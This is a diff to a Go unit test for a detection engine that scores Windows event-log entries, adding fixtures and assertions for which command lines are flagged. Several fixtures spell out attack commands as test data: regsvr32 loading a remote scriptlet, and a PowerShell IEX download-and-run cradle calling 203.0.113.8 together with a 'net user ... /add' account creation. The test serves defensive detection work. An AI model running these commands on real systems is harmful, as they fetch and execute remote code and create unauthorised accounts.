@@ -28,6 +28,13 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 		{ID: "writable-script-task", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `C:\Windows\System32\wscript.exe "C:\Users\alice\AppData\Local\Temp\job.vbs"`},
 		{ID: "remote-data-task", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `wscript.exe C:\Tools\audit.vbs https://203.0.113.8/api`},
 		{ID: "unc-data-task", EventType: model.EventScheduledTaskCreate, ProcessName: "cscript.exe", CommandLine: `cscript.exe C:\Tools\audit.vbs \\host01\share\data.txt`},
+		{ID: "independent-dll", EventType: model.EventScheduledTaskCreate, ProcessName: "regsvr32.exe", CommandLine: `regsvr32.exe /s /i:local \\host01\share\scrobj.dll`},
+		{ID: "local-dll", EventType: model.EventScheduledTaskCreate, ProcessName: "regsvr32.exe", CommandLine: `regsvr32.exe /s /i:local C:\Temp\scrobj.dll`},
+		{ID: "quoted-install", EventType: model.EventScheduledTaskCreate, ProcessName: "regsvr32.exe", CommandLine: `regsvr32.exe /s /n /u /i:"https://203.0.113.8/a.sct" scrobj.dll`},
+		{ID: "token-hash", EventType: model.EventPowerShellScript, CommandLine: `Write-Output foo#bar; IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a'); net user alice DummySecret42 /add`},
+		{ID: "standalone-comment", EventType: model.EventPowerShellScript, CommandLine: `Write-Output foo #bar; IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')`},
+		{ID: "install-data", EventType: model.EventScheduledTaskCreate, ProcessName: "regsvr32.exe", CommandLine: `regsvr32.exe /i:"https://203.0.113.8/data" C:\Tools\audit.dll`},
+		{ID: "local-data", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `wscript.exe C:\Tools\audit.vbs C:\Temp\data.vbs`},
 	}
 	col := model.Collection{ID: "controls-collection", CaseID: c.ID, SourceType: model.SourceTypeLegacy, IngestionStatus: model.CollectionStatusPending}
 	sf := model.SourceFile{ID: "controls-source", CaseID: c.ID, CollectionID: col.ID, OriginalFilename: "normalized.json", Path: "normalized.json", ImportStatus: model.SourceFileImported, Supported: true, Parser: "normalized-software-proof", ArtifactType: model.ArtifactWindowsEventLog}
@@ -65,16 +72,24 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 			t.Fatal("finding secret leak")
 		}
 	}
-	if len(selected) != 8 {
-		t.Fatalf("selected %d leads want 8: %+v", len(selected), selected)
+	if len(selected) != 12 {
+		t.Fatalf("selected %d leads want 12: %+v", len(selected), selected)
 	}
-	for _, id := range []string{"hostile-shell", "hostile-task", "hostile-script", "host-options-task", "escaped-script", "encoded-order-shell"} {
+	for _, id := range []string{"hostile-shell", "hostile-task", "hostile-script", "host-options-task", "escaped-script", "encoded-order-shell", "independent-dll", "quoted-install", "token-hash"} {
 		if selected[id].Severity != model.SeverityHigh {
 			t.Fatalf("lost positive %s", id)
 		}
 	}
 	if selected["unknown-encoded"].Severity != model.SeverityMedium {
 		t.Fatal("unknown encoded lead lost or over-escalated")
+	}
+	if f := selected["local-dll"]; f.Severity != model.SeverityMedium || f.Confidence != model.ConfidenceLow {
+		t.Fatal("independent local DLL lost medium/low lead")
+	}
+	for _, id := range []string{"remote-data-task", "unc-data-task", "standalone-comment", "install-data", "local-data"} {
+		if _, ok := selected[id]; ok {
+			t.Fatalf("data/comment selected: %s", id)
+		}
 	}
 	if f := selected["writable-script-task"]; f.Severity != model.SeverityMedium || f.Confidence != model.ConfidenceLow {
 		t.Fatal("writable script target lost medium/low lead")
